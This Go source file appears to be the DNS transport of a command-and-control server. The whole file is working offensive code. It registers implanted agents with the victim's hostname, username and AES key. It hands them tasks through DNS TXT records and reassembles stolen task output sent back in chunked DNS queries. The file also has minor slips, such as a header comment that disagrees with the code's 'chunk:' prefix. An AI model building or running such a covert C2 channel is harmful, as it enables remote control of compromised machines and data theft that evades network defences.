package server

import (
	"encoding/base32"
	"encoding/json"
	"fmt"
	"net"
	"strings"
	"sync"
	"time"

	"github.com/miekg/dns"
)

// DNS C2 transport — authoritative NS for a configured domain.
//
// Query protocol (agent → server):
//   reg.<b32_chunk>.<seq>.<total>.<agentid16>.<domain>   register sysinfo chunk
//   poll.<agentid16>.<domain>                            poll for tasks
//   res.<b32_chunk>.<seq>.<total>.<taskid_hex>.<agentid16>.<domain>  result chunk
//
// Response (server → agent): TXT record
//   "ok"                registration accepted
//   "nil"               no pending task
//   <b32_task_json>     task pending (full or chunk "more:<total>")
//   "chunk.<b32_data>"  next chunk of a large task
//   "ack"               result chunk accepted

var b32 = base32.StdEncoding.WithPadding(base32.NoPadding)

type dnsC2 struct {
	s      *Server
	domain string // lower-case with trailing dot, e.g. "c2.local."

	mu      sync.Mutex
	regBuf  map[string]map[int]string // agentid → {seq → b32_chunk}
	resBuf  map[string]map[int]string // "taskid:agentid" → {seq → b32_chunk}
	taskOut map[string][]string       // agentid → []b32_chunks for current task
}

// StartDNS starts an authoritative UDP DNS server on port 53 (or custom port).
func (s *Server) StartDNS(domain string, port int) (int, error) {
	if !strings.HasSuffix(domain, ".") {
		domain += "."
	}
	dc := &dnsC2{
		s:       s,
		domain:  strings.ToLower(domain),
		regBuf:  make(map[string]map[int]string),
		resBuf:  make(map[string]map[int]string),
		taskOut: make(map[string][]string),
	}

	job := s.addJob("DNS", port)
	srv := &dns.Server{
		Addr:    fmt.Sprintf(":%d", port),
		Net:     "udp",
		Handler: dc,
	}

	go func() {
		s.printf("[*] DNS C2 listener on :%d  domain=%s  (job #%d)\n", port, domain, job.ID)
		if err := srv.ListenAndServe(); err != nil {
			s.stopJob(job.ID)
		}
	}()

	_ = srv // not tracked in jobSrvs (DNS has different shutdown)
	return job.ID, nil
}

func (dc *dnsC2) ServeDNS(w dns.ResponseWriter, r *dns.Msg) {
	m := new(dns.Msg)
	m.SetReply(r)
	m.Authoritative = true

	if len(r.Question) == 0 {
		w.WriteMsg(m)
		return
	}

	q := r.Question[0]
	name := strings.ToLower(q.Name)

	// strip our domain suffix
	if !strings.HasSuffix(name, "."+dc.domain) && name != dc.domain {
		// not our domain
		m.Rcode = dns.RcodeNameError
		w.WriteMsg(m)
		return
	}
	sub := strings.TrimSuffix(name, "."+dc.domain)
	sub = strings.TrimSuffix(sub, ".")

	var txt string
	labels := strings.Split(sub, ".")
	if len(labels) > 0 {
		txt = dc.handleQuery(labels)
	}
	if txt == "" {
		txt = "nil"
	}

	if q.Qtype == dns.TypeTXT || q.Qtype == dns.TypeANY {
		m.Answer = append(m.Answer, &dns.TXT{
			Hdr: dns.RR_Header{
				Name:   q.Name,
				Rrtype: dns.TypeTXT,
				Class:  dns.ClassINET,
				Ttl:    0,
			},
			Txt: []string{txt},
		})
	}
	// Always add a minimal A record so queries don't fail in restrictive resolvers
	if q.Qtype == dns.TypeA || q.Qtype == dns.TypeANY {
		m.Answer = append(m.Answer, &dns.A{
			Hdr: dns.RR_Header{
				Name:   q.Name,
				Rrtype: dns.TypeA,
				Class:  dns.ClassINET,
				Ttl:    0,
			},
			A: net.ParseIP("1.2.3.4"),
		})
	}
	w.WriteMsg(m)
}

// handleQuery dispatches the DNS query to the appropriate handler.
// labels = subdomain labels without the c2 domain, in left-to-right order.
func (dc *dnsC2) handleQuery(labels []string) string {
	if len(labels) == 0 {
		return "nil"
	}
	verb := labels[0]
	switch verb {
	case "reg":
		// reg.<b32_chunk>.<seq>.<total>.<agentid16>
		if len(labels) < 5 {
			return "err:bad-reg"
		}
		chunk := labels[1]
		seq := parseIntLabel(labels[2])
		total := parseIntLabel(labels[3])
		agentID := labels[4]
		return dc.handleReg(agentID, chunk, seq, total)

	case "poll":
		// poll.<agentid16>
		if len(labels) < 2 {
			return "err:bad-poll"
		}
		return dc.handlePoll(labels[1])

	case "res":
		// res.<b32_chunk>.<seq>.<total>.<taskid_hex>.<agentid16>
		if len(labels) < 6 {
			return "err:bad-res"
		}
		chunk := labels[1]
		seq := parseIntLabel(labels[2])
		total := parseIntLabel(labels[3])
		taskIDHex := labels[4]
		agentID := labels[5]
		return dc.handleResult(agentID, taskIDHex, chunk, seq, total)

	case "chunk":
		// chunk.<seq>.<agentid16> — agent requests next chunk of large task
		if len(labels) < 3 {
			return "nil"
		}
		seq := parseIntLabel(labels[1])
		agentID := labels[2]
		return dc.getTaskChunk(agentID, seq)
	}
	return "nil"
}

// handleReg processes a registration chunk from an agent.
func (dc *dnsC2) handleReg(agentID, b32Chunk string, seq, total int) string {
	dc.mu.Lock()
	if dc.regBuf[agentID] == nil {
		dc.regBuf[agentID] = make(map[int]string)
	}
	dc.regBuf[agentID][seq] = b32Chunk
	complete := len(dc.regBuf[agentID]) == total
	var chunks map[int]string
	if complete {
		chunks = dc.regBuf[agentID]
		delete(dc.regBuf, agentID)
	}
	dc.mu.Unlock()

	if !complete {
		return "ok"
	}

	// reassemble
	data, err := reassembleChunks(chunks, total)
	if err != nil {
		return "err:reassemble"
	}

	var info struct {
		Hostname string `json:"hostname"`
		Username string `json:"username"`
		OS       string `json:"os"`
		PID      int    `json:"pid"`
		AESKey   string `json:"aes_key"`
	}
	if err := json.Unmarshal(data, &info); err != nil {
		return "err:json"
	}

	aesKey, _ := b32.DecodeString(strings.ToUpper(info.AESKey))
	a := &Agent{
		ID:        agentID,
		Hostname:  info.Hostname,
		Username:  info.Username,
		OS:        info.OS,
		PID:       info.PID,
		AESKey:    aesKey,
		SleepSec:  60,
		JitterPct: 20,
		Transport: "dns",
		Active:    true,
	}
	if err := dc.s.db.RegisterAgent(a); err != nil {
		dc.s.printf("[dns] register failed: %v\n", err)
		return "err:db"
	}
	dc.s.printf("[dns] agent registered: %s  %s@%s\n", agentID[:8], info.Username, info.Hostname)
	return "ok"
}

// handlePoll returns the next pending task for an agent.
func (dc *dnsC2) handlePoll(agentID string) string {
	dc.s.db.TouchAgent(agentID)

	// check if agent already has a chunked task queued
	dc.mu.Lock()
	chunks, has := dc.taskOut[agentID]
	dc.mu.Unlock()
	if has && len(chunks) > 0 {
		return fmt.Sprintf("more:%d", len(chunks))
	}

	tasks, err := dc.s.db.PendingTasks(agentID)
	if err != nil || len(tasks) == 0 {
		return "nil"
	}

	task := tasks[0]
	dc.s.db.MarkTaskFetched(task.ID)

	tw := struct {
		ID   int64  `json:"id"`
		Type string `json:"type"`
		Args string `json:"args"`
	}{ID: task.ID, Type: task.Type, Args: task.Args}
	data, _ := json.Marshal(tw)

	// encode as b32
	encoded := strings.ToLower(b32.EncodeToString(data))

	// split into 48-char chunks
	chunks = chunkString(encoded, 48)
	if len(chunks) == 1 {
		return chunks[0]
	}
	// store remaining chunks for chunked fetch
	dc.mu.Lock()
	dc.taskOut[agentID] = chunks[1:]
	dc.mu.Unlock()
	return fmt.Sprintf("more:%d", len(chunks))
}

// getTaskChunk returns chunk seq for a chunked task delivery.
func (dc *dnsC2) getTaskChunk(agentID string, seq int) string {
	dc.mu.Lock()
	chunks, ok := dc.taskOut[agentID]
	dc.mu.Unlock()
	if !ok || seq < 0 || seq >= len(chunks) {
		return "nil"
	}
	chunk := chunks[seq]
	if seq == len(chunks)-1 {
		dc.mu.Lock()
		delete(dc.taskOut, agentID)
		dc.mu.Unlock()
	}
	return "chunk:" + chunk
}

// handleResult processes a result chunk from an agent.
func (dc *dnsC2) handleResult(agentID, taskIDHex, b32Chunk string, seq, total int) string {
	key := taskIDHex + ":" + agentID
	dc.mu.Lock()
	if dc.resBuf[key] == nil {
		dc.resBuf[key] = make(map[int]string)
	}
	dc.resBuf[key][seq] = b32Chunk
	complete := len(dc.resBuf[key]) == total
	var chunks map[int]string
	if complete {
		chunks = dc.resBuf[key]
		delete(dc.resBuf, key)
	}
	dc.mu.Unlock()

	if !complete {
		return "ack"
	}

	data, err := reassembleChunks(chunks, total)
	if err != nil {
		return "err:reassemble"
	}

	var result struct {
		TaskID int64  `json:"task_id"`
		Output string `json:"output"`
		Error  string `json:"error"`
	}
	if err := json.Unmarshal(data, &result); err != nil {
		return "err:json"
	}

	dc.s.db.InsertResult(result.TaskID, agentID, result.Output, result.Error)
	dc.s.printf("[dns] result for task #%d from %s\n", result.TaskID, agentID[:8])
	return "ack"
}

// ── helpers ───────────────────────────────────────────────────────────────

func parseIntLabel(s string) int {
	n := 0
	for _, c := range s {
		if c >= '0' && c <= '9' {
			n = n*10 + int(c-'0')
		}
	}
	return n
}

func chunkString(s string, size int) []string {
	var chunks []string
	for len(s) > size {
		chunks = append(chunks, s[:size])
		s = s[size:]
	}
	if len(s) > 0 {
		chunks = append(chunks, s)
	}
	return chunks
}

func reassembleChunks(chunks map[int]string, total int) ([]byte, error) {
	var sb strings.Builder
	for i := 0; i < total; i++ {
		c, ok := chunks[i]
		if !ok {
			return nil, fmt.Errorf("missing chunk %d", i)
		}
		sb.WriteString(c)
	}
	return b32.DecodeString(strings.ToUpper(sb.String()))
}

// DNSServerInfo carries runtime info for active DNS jobs.
type DNSServerInfo struct {
	Domain string
	Port   int
	Since  time.Time
}
